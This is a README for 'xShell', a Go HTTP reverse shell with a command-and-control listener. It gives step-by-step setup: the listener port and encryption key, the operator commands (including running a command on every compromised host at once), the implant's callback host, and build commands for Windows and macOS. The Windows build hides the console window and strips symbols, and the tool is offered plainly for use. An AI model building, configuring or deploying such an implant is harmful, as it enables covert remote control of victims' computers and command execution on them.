<div align="center">
  <h1>xShell</h1>
  <br/>
  <p><i>A simple concurrent http shell</i></p>
  <br/>
</div>

# About
- Commands are executed by workers
- Workers are goroutines that simply execute the commands
- All workers are indexed in a worker map
- Workers are dynamically allocated based on workload
- Beacon workers are responsible for callbacks
# Usage
### Change listener port:
In c2/c2.go:
```go
var Port string = "" // change port here
var Key string = "" // set encryption key here (must match key in payload)
```

### Start listener:
```sh
go run c2/c2.go
```
If listening on a protected port (any port under 1024) use sudo:
```sh
sudo go run c2/c2.go
```

### Listener commands:
```
shells - list all active shells
shell <shell_name> - interact with specifc shell
mexec <command> - executes command on all shells
clear - clears console
quit - shuts down C2
exit - return to main menu (shell continues to run)
```

### Set call back host:
In payload/xShell.go:
```go
var KeyStr string = "" // must be 16, 24, 32 bytes
var C2Host string = "" // set C2 host ip or hostname (must start with https://)
```

### Build shell:
```sh
GOOS=windows GOARCH=amd64 go build -ldflags "-H 'windowsgui' -w -s" -o xShell.exe payload/xShell.go # for Windows 64bit amd64
GOOS=darwin GOARCH=amd64 go build -ldflags "-w -s" -o xShellosx payload/xShell.go # for macOS 64bit amd64
```

# License
[Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
